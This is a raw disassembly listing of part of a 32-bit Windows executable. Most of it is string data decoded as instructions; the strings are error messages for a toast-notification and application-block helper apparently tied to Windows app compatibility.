  4016f8:	outs   dx,DWORD PTR ds:[esi]
  4016f9:	jb     0x401760
  4016fb:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  4016ff:	popa   
  401700:	bound  esp,QWORD PTR [ecx+0x73]
  401703:	and    BYTE PTR gs:[edi+0x55],al
  401707:	dec    ecx
  401708:	inc    esp
  401709:	add    BYTE PTR [eax],al
  40170b:	add    BYTE PTR [esi+0x61],al
  40170e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401716:	jo     0x401779
  401718:	jb     0x40178d
  40171a:	and    BYTE PTR gs:[ebx+0x42],cl
  40171e:	and    BYTE PTR [ecx+0x72],al
  401721:	je     0x40178c
  401723:	arpl   WORD PTR [ebp+eiz*2+0x20],bp
  401727:	popa   
  401728:	jb     0x401791
  40172a:	jne    0x401799
  40172c:	outs   dx,BYTE PTR gs:[esi]
  40172e:	je     0x401730
  401730:	inc    esi
  401731:	popa   
  401732:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40173a:	jo     0x40179d
  40173c:	jb     0x4017b1
  40173e:	and    BYTE PTR gs:[ecx+0x70],al
  401742:	jo     0x401764
  401744:	push   ebx
  401745:	je     0x4017b6
  401747:	jb     0x4017ae
  401749:	dec    ecx
  40174a:	and    BYTE PTR fs:[ecx+0x72],ah
  40174e:	addr16 jne 0x4017be
  401751:	outs   dx,BYTE PTR gs:[esi]
  401753:	je     0x401755
  401755:	add    BYTE PTR [eax],al
  401757:	add    BYTE PTR [esi+0x61],al
  40175a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401762:	jae    0x4017d8
  401764:	outs   dx,DWORD PTR ds:[esi]
  401765:	jb     0x4017cc
  401767:	and    BYTE PTR [ecx+0x70],al
  40176a:	jo     0x40178c
  40176c:	push   ebx
  40176d:	je     0x4017de
  40176f:	jb     0x4017d6
  401771:	dec    ecx
  401772:	and    BYTE PTR fs:[ecx+0x72],ah
  401776:	addr16 jne 0x4017e6
  401779:	outs   dx,BYTE PTR gs:[esi]
  40177b:	je     0x40177d
  40177d:	add    BYTE PTR [eax],al
  40177f:	add    BYTE PTR [esi+0x61],al
  401782:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40178a:	jo     0x4017ed
  40178c:	jb     0x401801
  40178e:	and    BYTE PTR gs:[ebx+0x75],dh
  401792:	ins    DWORD PTR es:[edi],dx
  401793:	ins    DWORD PTR es:[edi],dx
  401794:	popa   
  401795:	jb     0x401810
  401797:	and    BYTE PTR [ecx+0x72],ah
  40179a:	addr16 jne 0x40180a
  40179d:	outs   dx,BYTE PTR gs:[esi]
  40179f:	je     0x4017a1
  4017a1:	add    BYTE PTR [eax],al
  4017a3:	add    BYTE PTR [esi+0x61],al
  4017a6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4017ae:	jae    0x401824
  4017b0:	outs   dx,DWORD PTR ds:[esi]
  4017b1:	jb     0x401818
  4017b3:	and    BYTE PTR [ebx+0x75],dh
  4017b6:	ins    DWORD PTR es:[edi],dx
  4017b7:	ins    DWORD PTR es:[edi],dx
  4017b8:	popa   
  4017b9:	jb     0x401834
  4017bb:	and    BYTE PTR [ecx+0x72],ah
  4017be:	addr16 jne 0x40182e
  4017c1:	outs   dx,BYTE PTR gs:[esi]
  4017c3:	je     0x4017c5
  4017c5:	add    BYTE PTR [eax],al
  4017c7:	add    BYTE PTR [esi+0x61],al
  4017ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4017d2:	jae    0x401848
  4017d4:	outs   dx,DWORD PTR ds:[esi]
  4017d5:	jb     0x40183c
  4017d7:	and    BYTE PTR [ebp+0x52],dl
  4017da:	dec    esp
  4017db:	and    BYTE PTR [ecx+0x72],ah
  4017de:	addr16 jne 0x40184e
  4017e1:	outs   dx,BYTE PTR gs:[esi]
  4017e3:	je     0x4017e5
  4017e5:	add    BYTE PTR [eax],al
  4017e7:	add    BYTE PTR [esi+0x61],al
  4017ea:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  4017f2:	jae    0x401868
  4017f4:	outs   dx,DWORD PTR ds:[esi]
  4017f5:	jb     0x40185c
  4017f7:	and    BYTE PTR [esi+0x65],dh
  4017fa:	outs   dx,BYTE PTR ds:[esi]
  4017fb:	outs   dx,DWORD PTR fs:[esi]
  4017fd:	jb     0x40181f
  4017ff:	outs   dx,BYTE PTR ds:[esi]
  401800:	popa   
  401801:	ins    DWORD PTR es:[edi],dx
  401802:	and    BYTE PTR gs:[ecx+0x72],ah
  401806:	addr16 jne 0x401876
  401809:	outs   dx,BYTE PTR gs:[esi]
  40180b:	je     0x40180d
  40180d:	add    BYTE PTR [eax],al
  40180f:	add    BYTE PTR [esi+0x61],al
  401812:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40181a:	jo     0x40187d
  40181c:	jb     0x401891
  40181e:	and    BYTE PTR gs:[ebp+0x78],ah
  401822:	arpl   WORD PTR gs:[ebp+0x74],si
  401826:	popa   
  401827:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  40182b:	inc    edi
  40182c:	push   ebp
  40182d:	dec    ecx
  40182e:	inc    esp
  40182f:	and    BYTE PTR [ecx+0x72],ah
  401832:	addr16 jne 0x4018a2
  401835:	outs   dx,BYTE PTR gs:[esi]
  401837:	je     0x401839
  401839:	add    BYTE PTR [eax],al
  40183b:	add    BYTE PTR [esi+0x61],al
  40183e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401846:	jae    0x4018bc
  401848:	outs   dx,DWORD PTR ds:[esi]
  401849:	jb     0x4018b0
  40184b:	and    BYTE PTR [ebp+0x78],ah
  40184e:	arpl   WORD PTR gs:[ebp+0x74],si
  401852:	popa   
  401853:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  401857:	inc    edi
  401858:	push   ebp
  401859:	dec    ecx
  40185a:	inc    esp
  40185b:	add    BYTE PTR [ecx+0x6e],cl
  40185e:	jbe    0x4018c1
  401860:	ins    BYTE PTR es:[edi],dx
  401861:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x62617461
  401869:	popa   
  40186a:	jae    0x4018d1
  40186c:	and    BYTE PTR [edi+0x55],al
  40186f:	dec    ecx
  401870:	inc    esp
  401871:	and    BYTE PTR [ebx+0x70],dh
  401874:	arpl   WORD PTR gs:[ecx+0x66],bp
  401878:	imul   esp,DWORD PTR [ebp+0x64],0x6c615600
  40187f:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x70704165
  401887:	push   0x44706c65
  40188c:	popa   
  40188d:	je     0x4018f0
  40188f:	add    BYTE PTR [ecx+0x6e],cl
  401892:	jbe    0x4018f5
  401894:	ins    BYTE PTR es:[edi],dx
  401895:	imul   esp,DWORD PTR [eax+eiz*1+0x65],0x75636578
  40189d:	je     0x401900
  40189f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x20]
  4018a3:	inc    edi
  4018a4:	push   ebp
  4018a5:	dec    ecx
  4018a6:	inc    esp
  4018a7:	and    BYTE PTR [ebx+0x70],dh
  4018aa:	arpl   WORD PTR gs:[ecx+0x66],bp
  4018ae:	imul   esp,DWORD PTR [ebp+0x64],0x49000000
  4018b5:	outs   dx,BYTE PTR ds:[esi]
  4018b6:	jbe    0x401919
  4018b8:	ins    BYTE PTR es:[edi],dx
  4018b9:	imul   esp,DWORD PTR [eax+eiz*1+0x61],0x696c7070
  4018c1:	arpl   WORD PTR [ecx+0x74],sp
  4018c4:	imul   ebp,DWORD PTR [edi+0x6e],0x6d616e20
  4018cb:	and    BYTE PTR gs:[ebx+0x70],dh
  4018cf:	arpl   WORD PTR gs:[ecx+0x66],bp
  4018d3:	imul   esp,DWORD PTR [ebp+0x64],0x6e490000
  4018da:	jbe    0x40193d
  4018dc:	ins    BYTE PTR es:[edi],dx
  4018dd:	imul   esp,DWORD PTR [eax+eiz*1+0x76],0x6f646e65
  4018e5:	jb     0x401907
  4018e7:	outs   dx,BYTE PTR ds:[esi]
  4018e8:	popa   
  4018e9:	ins    DWORD PTR es:[edi],dx
  4018ea:	and    BYTE PTR gs:[ebx+0x70],dh
  4018ee:	arpl   WORD PTR gs:[ecx+0x66],bp
  4018f2:	imul   esp,DWORD PTR [ebp+0x64],0x49000000
  4018f9:	outs   dx,BYTE PTR ds:[esi]
  4018fa:	jbe    0x40195d
  4018fc:	ins    BYTE PTR es:[edi],dx
  4018fd:	imul   esp,DWORD PTR [eax+eiz*1+0x70],0x6c626f72
  401905:	gs ins DWORD PTR es:[edi],dx
  401907:	and    BYTE PTR [ebp+eiz*2+0x74],ah
  40190b:	popa   
  40190c:	imul   ebp,DWORD PTR [ebx+esi*2+0x20],0x63657073
  401914:	imul   esp,DWORD PTR [esi+0x69],0x6465
  40191b:	add    BYTE PTR [ebp+0x0],dh
  40191e:	jae    0x401920
  401920:	add    BYTE PTR gs:[edx+0x0],dh
  401924:	xor    eax,DWORD PTR [eax]
  401926:	xor    al,BYTE PTR [eax]
  401928:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40192d:	add    BYTE PTR [eax+eax*1+0x0],ch
  401931:	add    BYTE PTR [eax],al
  401933:	add    BYTE PTR [esi+0x6f],cl
  401936:	and    BYTE PTR [ebx+0x6f],ah
  401939:	ins    DWORD PTR es:[edi],dx
  40193a:	ins    DWORD PTR es:[edi],dx
  40193b:	popa   
  40193c:	outs   dx,BYTE PTR ds:[esi]
  40193d:	fs sub eax,0x656e696c
  401943:	and    BYTE PTR [ecx+0x72],ah
  401946:	addr16 jne 0x4019b6
  401949:	outs   dx,BYTE PTR gs:[esi]
  40194b:	je     0x4019c0
  40194d:	and    BYTE PTR [ebx+0x70],dh
  401950:	arpl   WORD PTR gs:[ecx+0x66],bp
  401954:	imul   esp,DWORD PTR [ebp+0x64],0x69577700
  40195b:	outs   dx,BYTE PTR ds:[esi]
  40195c:	dec    ebp
  40195d:	popa   
  40195e:	imul   ebp,DWORD PTR [esi+0x0],0x46000000
  401965:	popa   
  401966:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  40196e:	jo     0x4019d1
  401970:	jb     0x4019e5
  401972:	and    BYTE PTR gs:[ebx+0x6f],ah
  401976:	ins    DWORD PTR es:[edi],dx
  401977:	ins    DWORD PTR es:[edi],dx
  401978:	popa   
  401979:	outs   dx,BYTE PTR ds:[esi]
  40197a:	fs sub eax,0x656e696c
  401980:	and    BYTE PTR [ecx+0x72],ah
  401983:	addr16 jne 0x4019f3
  401986:	outs   dx,BYTE PTR gs:[esi]
  401988:	je     0x4019fd
  40198a:	add    BYTE PTR [eax],al
  40198c:	inc    esi
  40198d:	popa   
  40198e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401996:	jbe    0x4019f9
  401998:	ins    BYTE PTR es:[edi],dx
  401999:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6f632065
  4019a1:	ins    DWORD PTR es:[edi],dx
  4019a2:	ins    DWORD PTR es:[edi],dx
  4019a3:	popa   
  4019a4:	outs   dx,BYTE PTR ds:[esi]
  4019a5:	fs sub eax,0x656e696c
  4019ab:	and    BYTE PTR [ecx+0x72],ah
  4019ae:	addr16 jne 0x401a1e
  4019b1:	outs   dx,BYTE PTR gs:[esi]
  4019b3:	je     0x401a28
  4019b5:	add    BYTE PTR [eax],al
  4019b7:	add    BYTE PTR [esi+0x6f],cl
  4019ba:	and    BYTE PTR [ecx+0x44],al
  4019bd:	push   ebx
  4019be:	and    BYTE PTR [esi+0x6f],ah
  4019c1:	jne    0x401a31
  4019c3:	and    BYTE PTR fs:[esi+0x6f],ah
  4019c7:	jb     0x4019e9
  4019c9:	jb     0x401a30
  4019cb:	imul   ebp,DWORD PTR [esi+0x73],0x6c6c6174
  4019d2:	pop    edi
  4019d3:	jne    0x401a45
  4019d5:	addr16 jb 0x401a39
  4019d8:	fs and BYTE PTR gs:[ecx+0x70],ah
  4019dd:	jo     0x401a47
  4019df:	gs ins BYTE PTR es:[edi],dx
  4019e1:	jo     0x4019e3
  4019e3:	add    BYTE PTR [eax+0x61],cl
  4019e6:	outs   dx,BYTE PTR ds:[esi]
  4019e7:	fs ins BYTE PTR es:[edi],dx
  4019e9:	gs inc ecx
  4019eb:	jo     0x401a5d
  4019ed:	push   0x4d706c65
  4019f2:	gs jae 0x401a68
  4019f5:	popa   
  4019f6:	addr16 gs inc ebp
  4019f9:	jbe    0x401a60
  4019fb:	outs   dx,BYTE PTR ds:[esi]
  4019fc:	je     0x401a1e
  4019fe:	popaw  
  401a00:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x78255b20
  401a08:	pop    ebp
  401a09:	add    BYTE PTR [eax],al
  401a0b:	add    BYTE PTR [eax],al
  401a0d:	add    BYTE PTR [eax],al
  401a0f:	add    BYTE PTR [ecx+0x6e],al
  401a12:	and    BYTE PTR [ebp+0x6e],dh
  401a15:	push   0x6c646e61
  401a1a:	gs and BYTE PTR fs:[edx+0x6c],ah
  401a1f:	outs   dx,DWORD PTR ds:[esi]
  401a20:	arpl   WORD PTR [ebx+0x20],bp
  401a23:	je     0x401a9e
  401a25:	jo     0x401a8c
  401a27:	and    BYTE PTR [esi+0x6f],ah
  401a2a:	jb     0x401a4c
  401a2c:	je     0x401a9d
  401a2e:	popa   
  401a2f:	jae    0x401aa5
  401a31:	and    BYTE PTR [edi+0x61],dh
  401a34:	jae    0x401a56
  401a36:	outs   dx,BYTE PTR gs:[esi]
  401a38:	arpl   WORD PTR [edi+0x75],bp
  401a3b:	outs   dx,BYTE PTR ds:[esi]
  401a3c:	je     0x401aa3
  401a3e:	jb     0x401aa5
  401a40:	and    BYTE PTR fs:[eax],ch
  401a43:	bound  ebp,QWORD PTR [edi+ebp*2+0x63]
  401a47:	imul   esp,DWORD PTR [eax],0x74
  401a4a:	jns    0x401abc
  401a4c:	cmp    ah,BYTE PTR gs:[eax]
  401a4f:	and    eax,0x2964
  401a54:	pop    edi
  401a55:	push   ebx
  401a56:	push   0x6c42776f
  401a5b:	outs   dx,DWORD PTR ds:[esi]
  401a5c:	arpl   WORD PTR [ebx+0x4d],bp
  401a5f:	gs jae 0x401ad5
  401a62:	popa   
  401a63:	addr16 gs push edi
  401a66:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x7473616f
  401a6e:	add    BYTE PTR [eax],al
  401a70:	pop    edi
  401a71:	inc    ebx
  401a72:	jb     0x401ad9
  401a74:	popa   
  401a75:	je     0x401adc
  401a77:	inc    ecx
  401a78:	outs   dx,BYTE PTR ds:[esi]
  401a79:	fs inc esp
  401a7b:	imul   esi,DWORD PTR [ebx+0x70],0x5479616c
  401a82:	outs   dx,DWORD PTR ds:[esi]
  401a83:	popa   
  401a84:	jae    0x401afa
  401a86:	dec    ebp
  401a87:	gs jae 0x401afd
  401a8a:	popa   
  401a8b:	add    BYTE PTR gs:[bx+si],al
  401a8f:	add    BYTE PTR [edi+0x46],bl
  401a92:	outs   dx,DWORD PTR ds:[esi]
  401a93:	jb     0x401b02
  401a95:	popa   
  401a96:	je     0x401ad9
  401a98:	jo     0x401b0a
  401a9a:	ins    BYTE PTR es:[edi],dx
  401a9b:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  401aa2:	inc    edx
  401aa3:	ins    BYTE PTR es:[edi],dx
  401aa4:	outs   dx,DWORD PTR ds:[esi]
  401aa5:	arpl   WORD PTR [ebx+0x54],bp
  401aa8:	outs   dx,DWORD PTR ds:[esi]
  401aa9:	popa   
  401aaa:	jae    0x401b20
  401aac:	push   esp
  401aad:	gs js  0x401b24
  401ab0:	and    BYTE PTR [esi+0x61],ah
  401ab3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401abb:	outs   dx,WORD PTR ds:[esi]
  401abd:	jb     0x401b2c
  401abf:	popa   
  401ac0:	je     0x401ae2
  401ac2:	je     0x401b33
  401ac4:	popa   
  401ac5:	jae    0x401b3b
  401ac7:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  401acb:	je     0x401afb
  401acd:	add    BYTE PTR [eax],al
  401acf:	add    BYTE PTR [edi+0x69],dl
  401ad2:	outs   dx,BYTE PTR ds:[esi]
  401ad3:	outs   dx,DWORD PTR fs:[esi]
  401ad5:	ja     0x401b4a
  401ad7:	cmp    bh,BYTE PTR [edx]
  401ad9:	inc    esi
  401ada:	outs   dx,DWORD PTR ds:[esi]
  401adb:	jne    0x401b4b
  401add:	fs popa 
  401adf:	je     0x401b4a
  401ae1:	outs   dx,DWORD PTR ds:[esi]
  401ae2:	outs   dx,BYTE PTR ds:[esi]
  401ae3:	cmp    bh,BYTE PTR [edx]
  401ae5:	dec    ecx
  401ae6:	outs   dx,BYTE PTR ds:[esi]
  401ae7:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  401aef:	and    BYTE PTR [esi+0x61],ah
  401af2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x78255b20
  401afa:	pop    ebp
  401afb:	add    BYTE PTR [edi+0x65],al
  401afe:	je     0x401b41
  401b00:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  401b04:	popa   
  401b05:	je     0x401b70
  401b07:	outs   dx,DWORD PTR ds:[esi]
  401b08:	outs   dx,BYTE PTR ds:[esi]
  401b09:	inc    esi
  401b0a:	popa   
  401b0b:	arpl   WORD PTR [edi+ebp*2+0x72],si
  401b0f:	jns    0x401b31
  401b11:	popaw  
  401b13:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x726f6620
  401b1b:	and    BYTE PTR [edi+ebp*2+0x61],dl
  401b1f:	jae    0x401b95
  401b21:	dec    esi
  401b22:	outs   dx,DWORD PTR ds:[esi]
  401b23:	je     0x401b8e
  401b25:	imul   sp,WORD PTR [ebx+0x61],0x6974
  401b2b:	outs   dx,DWORD PTR ds:[esi]
  401b2c:	outs   dx,BYTE PTR ds:[esi]
  401b2d:	dec    ebp
  401b2e:	popa   
  401b2f:	outs   dx,BYTE PTR ds:[esi]
  401b30:	popa   
  401b31:	addr16 gs jb 0x401b55
  401b35:	pop    ebx
  401b36:	and    eax,0x5d78
  401b3b:	add    BYTE PTR [eax],al
  401b3d:	add    BYTE PTR [eax],al
  401b3f:	add    BYTE PTR [eax+0x0],ch
  401b42:	je     0x401b44
  401b44:	je     0x401b46
  401b46:	jo     0x401b48
  401b48:	cmp    al,BYTE PTR [eax]
  401b4a:	das    
  401b4b:	add    BYTE PTR [edi],ch
  401b4d:	add    BYTE PTR [edi+0x0],ah
  401b50:	outs   dx,DWORD PTR ds:[esi]
  401b51:	add    BYTE PTR [esi],ch
  401b53:	add    BYTE PTR [ebp+0x0],ch
  401b56:	imul   eax,DWORD PTR [eax],0x720063
  401b5c:	outs   dx,DWORD PTR ds:[esi]
  401b5d:	add    BYTE PTR [ebx+0x0],dh
  401b60:	outs   dx,DWORD PTR ds:[esi]
  401b61:	add    BYTE PTR [esi+0x0],ah
  401b64:	je     0x401b66
  401b66:	add    BYTE PTR cs:[ebx+0x0],ah
  401b6a:	outs   dx,DWORD PTR ds:[esi]
  401b6b:	add    BYTE PTR [ebp+0x0],ch
  401b6e:	das    
  401b6f:	add    BYTE PTR [esi+0x0],ah
  401b72:	ja     0x401b74
  401b74:	ins    BYTE PTR es:[edi],dx
  401b75:	add    BYTE PTR [ecx+0x0],ch
  401b78:	outs   dx,BYTE PTR ds:[esi]
  401b79:	add    BYTE PTR [ebx+0x0],ch
  401b7c:	das    
  401b7d:	add    BYTE PTR [edi],bh
  401b7f:	add    BYTE PTR [eax+eax*1+0x69],cl
  401b83:	add    BYTE PTR [esi+0x0],ch
  401b86:	imul   eax,DWORD PTR [eax],0x49
  401b89:	add    BYTE PTR [eax+eax*1+0x3d],ah
  401b8d:	add    BYTE PTR ds:0x6400,ah
  401b93:	add    BYTE PTR [eax],al
  401b95:	add    BYTE PTR [eax],al
  401b97:	add    BYTE PTR [eax+0x0],ch
  401b9a:	je     0x401b9c
  401b9c:	je     0x401b9e
  401b9e:	jo     0x401ba0
  401ba0:	cmp    al,BYTE PTR [eax]
  401ba2:	das    
  401ba3:	add    BYTE PTR [edi],ch
  401ba5:	add    BYTE PTR [ebx+0x0],dh
  401ba8:	jne    0x401baa
  401baa:	jo     0x401bac
  401bac:	jo     0x401bae
  401bae:	outs   dx,DWORD PTR ds:[esi]
  401baf:	add    BYTE PTR [edx+0x0],dh
  401bb2:	je     0x401bb4
  401bb4:	add    BYTE PTR cs:[ebp+0x0],ch
  401bb8:	imul   eax,DWORD PTR [eax],0x720063
  401bbe:	outs   dx,DWORD PTR ds:[esi]
  401bbf:	add    BYTE PTR [ebx+0x0],dh
  401bc2:	outs   dx,DWORD PTR ds:[esi]
  401bc3:	add    BYTE PTR [esi+0x0],ah
  401bc6:	je     0x401bc8
  401bc8:	add    BYTE PTR cs:[ebx+0x0],ah
  401bcc:	outs   dx,DWORD PTR ds:[esi]
  401bcd:	add    BYTE PTR [ebp+0x0],ch
  401bd0:	das    
  401bd1:	add    BYTE PTR [ebx+0x0],ch
  401bd4:	bound  eax,QWORD PTR [eax]
  401bd6:	das    
  401bd7:	add    BYTE PTR ds:0x6400,ah
  401bdd:	add    BYTE PTR [eax],al
  401bdf:	add    BYTE PTR [esi+0x6f],cl
  401be2:	and    BYTE PTR [ecx+eiz*2+0x74],ah
  401be6:	popa   
  401be7:	and    BYTE PTR [edi+ebp*2+0x20],dh
  401beb:	outs   dx,WORD PTR ds:[esi]
  401bed:	jb     0x401c5c
  401bef:	popa   
  401bf0:	je     0x401c12
  401bf2:	push   ebp
  401bf3:	jb     0x401c5e
  401bf5:	add    BYTE PTR cs:[eax],al
  401bf8:	inc    esi
  401bf9:	popa   
  401bfa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401c02:	outs   dx,WORD PTR ds:[esi]
  401c04:	jb     0x401c73
  401c06:	popa   
  401c07:	je     0x401c29
  401c09:	je     0x401c73
  401c0b:	and    BYTE PTR gs:[edi+ebp*2+0x61],dl
  401c10:	jae    0x401c86
  401c12:	and    BYTE PTR [ebp+0x72],dl
  401c15:	imul   esp,DWORD PTR [eax],0x5d78255b
  401c1b:	add    BYTE PTR [esi+0x61],al
  401c1e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401c26:	arpl   WORD PTR [edx+0x65],si
  401c29:	popa   
  401c2a:	je     0x401c91
  401c2c:	and    BYTE PTR [eax+0x72],dh
  401c2f:	outs   dx,DWORD PTR ds:[esi]
  401c30:	je     0x401ca1
  401c32:	arpl   WORD PTR [edi+0x6c],bp
  401c35:	and    BYTE PTR [edi+ebp*2+0x61],dh
  401c39:	jae    0x401caf
  401c3b:	and    BYTE PTR [eax+0x6d],bh
  401c3e:	ins    BYTE PTR es:[edi],dx
  401c3f:	and    BYTE PTR [ebx+0x25],bl
  401c42:	js     0x401ca1
  401c44:	add    BYTE PTR [eax],al
  401c46:	add    BYTE PTR [eax],al
  401c48:	inc    esi
  401c49:	popa   
  401c4a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401c52:	imul   esi,DWORD PTR fs:[ebx+0x70],0x2079616c
  401c5a:	je     0x401ccb
  401c5c:	popa   
  401c5d:	jae    0x401cd3
  401c5f:	and    BYTE PTR [ebx+0x25],bl
  401c62:	js     0x401cc1
  401c64:	add    BYTE PTR [eax],al
  401c66:	add    BYTE PTR [eax],al
  401c68:	dec    esi
  401c69:	outs   dx,DWORD PTR ds:[esi]
  401c6a:	and    BYTE PTR [ebp+0x52],dl
  401c6d:	dec    ecx
  401c6e:	and    BYTE PTR [ebx+0x70],dh
  401c71:	arpl   WORD PTR gs:[ecx+0x66],bp
  401c75:	imul   esp,DWORD PTR [ebp+0x64],0x726f6620
  401c7c:	and    BYTE PTR [edi+ebp*2+0x61],dh
  401c80:	jae    0x401cf6
  401c82:	add    BYTE PTR cs:[edi+0x43],bl
  401c86:	jb     0x401ced
  401c88:	popa   
  401c89:	je     0x401cf0
  401c8b:	push   eax
  401c8c:	jb     0x401cfd
  401c8e:	je     0x401cff
  401c90:	arpl   WORD PTR [edi+0x6c],bp
  401c93:	push   esp
  401c94:	outs   dx,DWORD PTR ds:[esi]
  401c95:	popa   
  401c96:	jae    0x401d0c
  401c98:	pop    eax
  401c99:	ins    DWORD PTR es:[edi],dx
  401c9a:	ins    BYTE PTR es:[edi],dx
  401c9b:	add    BYTE PTR [esi+0x61],al
  401c9e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401ca6:	addr16 gs je 0x401cca
  401caa:	push   esp
  401cab:	outs   dx,DWORD PTR ds:[esi]
  401cac:	popa   
  401cad:	jae    0x401d23
  401caf:	and    BYTE PTR [ebp+eiz*2+0x6d],dh
  401cb3:	jo     0x401d21
  401cb5:	popa   
  401cb6:	je     0x401d1d
  401cb8:	and    BYTE PTR [ebx+0x25],bl
  401cbb:	js     0x401d1a
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    BYTE PTR [eax+eax*1+0x65],dh
  401cc3:	add    BYTE PTR [eax+0x0],bh
  401cc6:	je     0x401cc8
  401cc8:	add    BYTE PTR [eax],al
  401cca:	add    BYTE PTR [eax],al
  401ccc:	inc    esi
  401ccd:	popa   
  401cce:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401cd6:	imul   bp,WORD PTR [esi+0x64],0x7420
  401cdc:	gs js  0x401d53
  401cdf:	and    BYTE PTR [ebp+0x6c],ah
  401ce2:	gs ins DWORD PTR es:[edi],dx
  401ce4:	outs   dx,BYTE PTR gs:[esi]
  401ce6:	je     0x401d5b
  401ce8:	and    BYTE PTR [ecx+0x6e],ch
  401ceb:	and    BYTE PTR [edi+ebp*2+0x61],dh
  401cef:	jae    0x401d65
  401cf1:	and    BYTE PTR [eax+0x6d],bh
  401cf4:	ins    BYTE PTR es:[edi],dx
  401cf5:	and    BYTE PTR [ebx+0x25],bl
  401cf8:	js     0x401d57
  401cfa:	add    BYTE PTR [eax],al
  401cfc:	inc    esi
  401cfd:	popa   
  401cfe:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401d06:	addr16 gs je 0x401d2a
  401d0a:	je     0x401d71
  401d0c:	js     0x401d82
  401d0e:	and    BYTE PTR [esi+0x6f],ch
  401d11:	fs and BYTE PTR gs:[ebx+0x6f],ah
  401d16:	jne    0x401d86
  401d18:	je     0x401d3a
  401d1a:	outs   dx,DWORD PTR ds:[esi]
  401d1b:	data16 and BYTE PTR [edi+ebp*2+0x61],dh
  401d20:	jae    0x401d96
  401d22:	and    BYTE PTR [eax+0x6d],bh
  401d25:	ins    BYTE PTR es:[edi],dx
  401d26:	and    BYTE PTR [ebx+0x25],bl
  401d29:	js     0x401d88
  401d2b:	add    BYTE PTR [esi+0x61],al
  401d2e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401d36:	addr16 gs je 0x401d5a
  401d3a:	xor    DWORD PTR [ebx+0x74],esi
  401d3d:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  401d41:	je     0x401d63
  401d43:	outs   dx,BYTE PTR ds:[esi]
  401d44:	outs   dx,DWORD PTR ds:[esi]
  401d45:	fs and BYTE PTR gs:[ebx+0x25],bl
  401d4a:	js     0x401da9
  401d4c:	add    BYTE PTR [eax],al
  401d4e:	add    BYTE PTR [eax],al
  401d50:	inc    esi
  401d51:	popa   
  401d52:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401d5a:	jae    0x401dc1
  401d5c:	je     0x401d7e
  401d5e:	je     0x401dc5
  401d60:	js     0x401dd6
  401d62:	and    BYTE PTR [esi+0x6f],ah
  401d65:	jb     0x401d87
  401d67:	xor    DWORD PTR [ebx+0x74],esi
  401d6a:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  401d6e:	je     0x401d90
  401d70:	outs   dx,BYTE PTR ds:[esi]
  401d71:	outs   dx,DWORD PTR ds:[esi]
  401d72:	fs and BYTE PTR gs:[ebx+0x25],bl
  401d77:	js     0x401dd6
  401d79:	add    BYTE PTR [eax],al
  401d7b:	add    BYTE PTR [esi+0x61],al
  401d7e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401d86:	addr16 gs je 0x401daa
  401d8a:	xor    ch,BYTE PTR [esi+0x64]
  401d8d:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  401d91:	je     0x401db3
  401d93:	outs   dx,BYTE PTR ds:[esi]
  401d94:	outs   dx,DWORD PTR ds:[esi]
  401d95:	fs and BYTE PTR gs:[ebx+0x25],bl
  401d9a:	js     0x401df9
  401d9c:	add    BYTE PTR [eax],al
  401d9e:	add    BYTE PTR [eax],al
  401da0:	inc    esi
  401da1:	popa   
  401da2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  401daa:	jae    0x401e11
  401dac:	je     0x401dce
  401dae:	je     0x401e15
  401db0:	js     0x401e26
  401db2:	and    BYTE PTR [esi+0x6f],ah
  401db5:	jb     0x401dd7
  401db7:	xor    ch,BYTE PTR [esi+0x64]
  401dba:	and    BYTE PTR [ebp+eiz*2+0x78],dh
  401dbe:	je     0x401de0
  401dc0:	outs   dx,BYTE PTR ds:[esi]
  401dc1:	outs   dx,DWORD PTR ds:[esi]
  401dc2:	fs and BYTE PTR gs:[ebx+0x25],bl
  401dc7:	js     0x401e26
  401dc9:	add    BYTE PTR [eax],al
  401dcb:	add    BYTE PTR [edx+0x0],ah
  401dce:	imul   eax,DWORD PTR [eax],0x64006e
